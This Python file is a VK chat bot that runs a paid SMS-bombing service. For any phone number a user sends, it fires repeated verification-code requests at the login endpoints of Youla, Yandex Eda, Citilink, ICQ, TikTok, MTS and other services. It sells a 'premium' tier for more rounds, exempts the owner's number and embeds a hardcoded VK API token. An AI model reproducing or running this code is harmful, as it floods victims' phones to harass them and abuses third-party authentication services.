import vk_api, random
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType
import requests
import random
import datetime
import sys
import re
import time
import datetime
import json
import threading
from threading import Thread
from colorama import Fore, Back, Style
from random import randint

token = "7fec2637a00df235aef1b31ef093509113153bf8aefad563b924ded337d3c297fd5c7662af96547891841"
vk = vk_api.VkApi(token=token) 
vk._auth_token()
longpoll = VkBotLongPoll(vk, 188206798) 

print("Бот запущен") 
def mask(strs, maska):
	if len(str(strs)) == maska.count('#'):
		str_list = list(str(strs))
		for i in str_list:
			maska=maska.replace("#", i, 1)
		return maska

def checkproxy(ip, prox):
	try:
		ipx = requests.get("http://fsystem88.ru/ip", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}, verify=False, timeout=10).text
	except:
		ipx = ip
	if ip != ipx:
		f = open("proxies.txt", "a+")
		f.write("{}\n".format(prox))
		f.close()

def b():	
	requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
	# requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, timeout=10)
	# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
	requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, timeout=10)
	requests.post("https://www.citilink.ru/registration/confirm/phone/+{phone}/", data={}, timeout=10)
	requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
	phone9 = phone[1:]
	requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
	requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, timeout=10)
	requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
	requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone}, timeout=10)
	if peer_id == 555422592:
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
	# requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, timeout=10)
	# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
	requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, timeout=10)
	requests.post("https://www.citilink.ru/registration/confirm/phone/+{phone}/", data={}, timeout=10)
	requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
	phone9 = phone[1:]
	requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
	requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, timeout=10)
	requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
	requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone}, timeout=10)
	requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
	# requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, timeout=10)
	# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
	requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, timeout=10)
	requests.post("https://www.citilink.ru/registration/confirm/phone/+{phone}/", data={}, timeout=10)
	requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
	phone9 = phone[1:]
	requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
	requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, timeout=10)
	requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
	requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone}, timeout=10)
	if peer_id == 460809808:
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
		# requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, timeout=10)
		# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, timeout=10)
		requests.post("https://www.citilink.ru/registration/confirm/phone/+{phone}/", data={}, timeout=10)
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
		phone9 = phone[1:]
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, timeout=10)
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone}, timeout=10)
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
		# requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, timeout=10)
		# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, timeout=10)
		requests.post("https://www.citilink.ru/registration/confirm/phone/+{phone}/", data={}, timeout=10)
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
		phone9 = phone[1:]
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, timeout=10)
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone}, timeout=10)
	if peer_id == 622423647:
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
		# requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, timeout=10)
		# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, timeout=10)
		requests.post("https://www.citilink.ru/registration/confirm/phone/+{phone}/", data={}, timeout=10)
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
		phone9 = phone[1:]
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, timeout=10)
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone}, timeout=10)
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
		# requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, timeout=10)
		# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, timeout=10)
		requests.post("https://www.citilink.ru/registration/confirm/phone/+{phone}/", data={}, timeout=10)
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
		phone9 = phone[1:]
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, timeout=10)
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone}, timeout=10)
def sendmsg(msg):
	vk.method("messages.send", { "peer_id": peer_id, "message": msg, "random_id": random.randint(1, 2147483647)})

while True: 
		for event in longpoll.listen():
			if event.type == VkBotEventType.MESSAGE_NEW:
				message = event.obj['message'] 
				peer_id = message['peer_id']
				text = message['text']
				text1 = list(text);		
				if text == "pid":
						sendmsg(peer_id)		
				elif text == "стоп":
					sendmsg("Остановленно!")
				elif text1[0] != "8":
					sendmsg("Неверный формат! Напишите номер через восьмерку! \nПример : 89613782121")
					break

				elif text != "/help":
					
					if peer_id == 557469128:
						phone = text
						sendmsg("premium detected")
						sendmsg("Спам на номер: "+phone+" Запущен [50 кругов]\nPremium Status активен!\nДо Конца Подписки Осталось 👉31 день")
						b()
						break
					if peer_id == 555422592:
						phone = text
						sendmsg("premium detected")
						sendmsg("Спам на номер: "+phone+" Запущен [50 кругов]\nPremium Status активен!\nДо Конца Подписки Осталось 👉31 день")
						b()
						break
					if peer_id == 460809808:
						phone = text
						sendmsg("premium detected")
						sendmsg("Спам на номер: "+phone+" Запущен [50 кругов]\nPremium Status активен!\nДо Конца Подписки Осталось 👉31 день")
						b()
						break
					if peer_id == 622423647:
						phone = text
						sendmsg("premium detected")
						sendmsg("Спам на номер: "+phone+" Запущен [50 кругов]\nPremium Status активен!\nДо Конца Подписки Осталось 👉31 день")
						b()
						break
					if text == "79604049192":
						sendmsg("Ошибка!")
						break
					if text == "89604049192":
						sendmsg("Ошибка!")
						break
					if text == '91':
						phone = "89604049192"
						sendmsg("Спам на номер: "+phone+" Запущен [1 круг]\nНа сегодня тебе хватит!\nСамое время покупать премиум!👉Всего 199р/мес")
						b()
					else:
						phone = text   	
						sendmsg("Спам на номер: "+phone+" Запущен [1 круг]\nНа сегодня тебе хватит!\nСамое время покупать премиум!👉Всего 199р/мес")
						b()
